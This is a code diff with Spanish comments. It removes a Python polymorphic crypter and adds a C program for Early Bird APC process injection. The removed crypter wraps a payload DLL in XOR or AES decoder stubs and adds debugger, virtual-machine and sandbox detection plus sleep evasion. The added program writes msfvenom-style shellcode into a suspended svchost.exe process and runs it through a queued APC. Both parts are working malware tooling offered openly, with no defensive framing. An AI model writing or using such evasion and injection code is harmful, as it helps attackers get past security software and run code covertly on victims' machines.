@@ -1,193 +1,138 @@
-cat > polymorphic_crypter.py << 'EOF'
-import random
-import string
-import os
-import sys
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad
-import base64
-
-class PolymorphicCrypter:
-    def __init__(self, payload_path):
-        try:
-            with open(payload_path, 'rb') as f:
-                self.payload = f.read()
-            self.key = os.urandom(32)
-            self.iv = os.urandom(16)
-            print(f"[+] Payload cargado: {len(self.payload)} bytes")
-        except FileNotFoundError:
-            print(f"[-] Error: No se encuentra el archivo {payload_path}")
-            sys.exit(1)
-    
-    def generate_decoder_stub(self):
-        """Genera un stub de decodificación único cada vez"""
-        # Técnicas de ofuscación aleatorias
-        techniques = [
-            self._xor_decoder,
-            self._aes_decoder
-        ]
-        return random.choice(techniques)()
-    
-    def _xor_decoder(self):
-        """Stub con XOR"""
-        xor_key = random.randint(1, 255)
-        encoded = bytes([b ^ xor_key for b in self.payload])
-        
-        stub = f'''
-void DecodeAndExecute() {{
-    unsigned char encoded[] = {{{','.join(map(str, encoded))}}};
-    unsigned char key = {xor_key};
-    
-    for(int i = 0; i < sizeof(encoded); i++) {{
-        encoded[i] ^= key;
-    }}
-    
-    // Ejecutar código decodificado
-    ((void(*)())encoded)();
-}}
-'''
-        return stub
-    
-    def _aes_decoder(self):
-        """Stub con AES"""
-        try:
-            cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
-            # Asegurar que el payload tenga el tamaño correcto para AES
-            padded_payload = pad(self.payload, AES.block_size)
-            encrypted = cipher.encrypt(padded_payload)
-        except Exception as e:
-            print(f"[-] Error en AES: {e}")
-            return self._xor_decoder()  # Fallback a XOR
-        
-        # Ofuscar clave e IV en el stub
-        key_obf = self._obfuscate_bytes(self.key)
-        iv_obf = self._obfuscate_bytes(self.iv)
-        
-        stub = f'''
+// early_bird_injection.c
 #include <windows.h>
-#include <wincrypt.h>
-
-void DecodeAndExecute() {{
-    unsigned char encrypted[] = {{{','.join(map(str, encrypted))}}};
-    unsigned char key[] = {{{key_obf}}};
-    unsigned char iv[] = {{{iv_obf}}};
-    HCRYPTPROV hProv;
-    HCRYPTHASH hHash;
-    HCRYPTKEY hKey;
-    
-    if(!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
-        return;
-    }}
-    
-    if(!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {{
-        CryptReleaseContext(hProv, 0);
-        return;
-    }}
-    
-    CryptHashData(hHash, key, sizeof(key), 0);
-    
-    if(!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {{
-        CryptDestroyHash(hHash);
-        CryptReleaseContext(hProv, 0);
-        return;
-    }}
-    
-    DWORD encrypted_len = sizeof(encrypted);
-    if(!CryptDecrypt(hKey, 0, TRUE, 0, encrypted, &encrypted_len)) {{
-        CryptDestroyKey(hKey);
-        CryptDestroyHash(hHash);
-        CryptReleaseContext(hProv, 0);
-        return;
-    }}
-    
-    // Ejecutar payload decodificado
-    void (*exec)() = (void(*)())encrypted;
-    exec();
-}}
-'''
-        return stub
-    
-    def _obfuscate_bytes(self, data):
-        """Ofusca bytes con operaciones matemáticas"""
-        parts = []
-        for b in data:
-            # Dividir cada byte en suma de dos números
-            a = random.randint(1, b-1) if b > 1 else 0
-            b_rest = b - a
-            parts.append(f"({a}+{b_rest})")
-        return ','.join(parts)
-    
-    def generate_final_payload(self):
-        """Genera el payload final polimórfico"""
-        stub = self.generate_decoder_stub()
-        
-        # Añadir código anti-debug y anti-sandbox
-        anti_debug = '''
-BOOL IsSandboxed() {
-    // Detectar depuración
-    if (IsDebuggerPresent()) return TRUE;
-    
-    // Detectar análisis en VM (simplificado)
-    HKEY hKey;
-    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
-        "SYSTEM\\\\CurrentControlSet\\\\Services\\\\Disk\\\\Enum", 
-        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        char value[256];
-        DWORD size = sizeof(value);
-        if (RegQueryValueEx(hKey, "0", NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS) {
-            if (strstr(value, "VBOX") || strstr(value, "VMWARE") || 
-                strstr(value, "QEMU") || strstr(value, "VIRTUAL")) {
-                RegCloseKey(hKey);
-                return TRUE;
-            }
-        }
-        RegCloseKey(hKey);
-    }
-    return FALSE;
-}
-'''
-        
-        final_code = f'''
-#include <windows.h>
-#include <winreg.h>
 #include <stdio.h>
+#include <tlhelp32.h>
 
-{anti_debug}
+// Shellcode que cargará nuestra DLL (msfvenom generado)
+// Este es un ejemplo simple, usaríamos un shellcode generado dinámicamente
+unsigned char shellcode[] = 
+"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
+"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
 
-{stub}
-
-int main() {{
-    if (IsSandboxed()) return 1;
+DWORD FindTargetProcess(const char* procname) {
+    HANDLE hSnapshot;
+    PROCESSENTRY32 pe;
+    DWORD pid = 0;
     
-    // Técnica de "sleep evasion"
-    Sleep(10000);  // Esperar 10 segundos para evadir sandboxes
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    pe.dwSize = sizeof(PROCESSENTRY32);
     
-    DecodeAndExecute();
+    if (!Process32First(hSnapshot, &pe))
+        return 0;
+    
+    do {
+        if (strcmp(pe.szExeFile, procname) == 0) {
+            pid = pe.th32ProcessID;
+            break;
+        }
+    } while (Process32Next(hSnapshot, &pe));
+    
+    CloseHandle(hSnapshot);
+    return pid;
+}
+
+BOOL EarlyBirdInjection(DWORD pid) {
+    HANDLE hProcess, hThread;
+    LPVOID pRemoteMemory;
+    
+    // Abrir proceso con los permisos necesarios
+    hProcess = OpenProcess(
+        PROCESS_CREATE_THREAD | 
+        PROCESS_QUERY_INFORMATION | 
+        PROCESS_VM_OPERATION | 
+        PROCESS_VM_WRITE | 
+        PROCESS_VM_READ,
+        FALSE, pid);
+    
+    if (!hProcess) {
+        printf("Error abriendo proceso: %d\n", GetLastError());
+        return FALSE;
+    }
+    
+    // Crear proceso suspendido (Early Bird)
+    STARTUPINFO si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    WCHAR cmdLine[] = L"C:\\Windows\\System32\\svchost.exe -k LocalService";
+    
+    if (!CreateProcessW(
+        NULL, cmdLine, NULL, NULL, FALSE,
+        CREATE_SUSPENDED | DETACHED_PROCESS,
+        NULL, NULL, &si, &pi)) {
+        printf("Error creando proceso suspendido: %d\n", GetLastError());
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    // Asignar memoria en el proceso suspendido
+    pRemoteMemory = VirtualAllocEx(
+        pi.hProcess, NULL, sizeof(shellcode),
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
+    if (!pRemoteMemory) {
+        printf("Error asignando memoria remota: %d\n", GetLastError());
+        TerminateProcess(pi.hProcess, 1);
+        return FALSE;
+    }
+    
+    // Escribir shellcode
+    if (!WriteProcessMemory(pi.hProcess, pRemoteMemory, shellcode, sizeof(shellcode), NULL)) {
+        printf("Error escribiendo memoria: %d\n", GetLastError());
+        VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
+        TerminateProcess(pi.hProcess, 1);
+        return FALSE;
+    }
+    
+    // Colocar APC en el hilo principal (aún suspendido)
+    PTHREAD_START_ROUTINE pfnAPC = (PTHREAD_START_ROUTINE)pRemoteMemory;
+    
+    if (!QueueUserAPC((PAPCFUNC)pfnAPC, pi.hThread, NULL)) {
+        printf("Error encolando APC: %d\n", GetLastError());
+        VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
+        TerminateProcess(pi.hProcess, 1);
+        return FALSE;
+    }
+    
+    // Reanudar hilo - el APC se ejecutará inmediatamente
+    ResumeThread(pi.hThread);
+    
+    printf("[+] Inyección Early Bird completada!\n");
+    
+    // Limpiar handles
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    CloseHandle(hProcess);
+    
+    return TRUE;
+}
+
+int main() {
+    DWORD pid = FindTargetProcess("svchost.exe");
+    
+    if (!pid) {
+        printf("No se encontró svchost.exe\n");
+        return 1;
+    }
+    
+    printf("[+] Inyectando en proceso suspendido...\n");
+    EarlyBirdInjection(pid);
+    
     return 0;
-}}
-'''
-        return final_code
-
-if __name__ == "__main__":
-    # Verificar que existe payload.dll
-    if not os.path.exists('payload.dll'):
-        print("[-] Error: No se encuentra payload.dll")
-        print("[*] Primero compila la DLL con:")
-        print("    x86_64-w64-mingw32-gcc -shared -o payload.dll dll_main.c -Os -s")
-        sys.exit(1)
-    
-    print("[*] Creando crypter polimórfico...")
-    crypter = PolymorphicCrypter('payload.dll')
-    payload_code = crypter.generate_final_payload()
-    
-    with open('final_payload.c', 'w') as f:
-        f.write(payload_code)
-    
-    print("[+] Payload polimórfico generado en final_payload.c")
-    print(f"[+] Tamaño del código: {len(payload_code)} bytes")
-    
-    # Mostrar una vista previa
-    print("\n[*] Vista previa del código generado:")
-    print("-" * 50)
-    print(payload_code[:500] + "...")
-    print("-" * 50)
+}
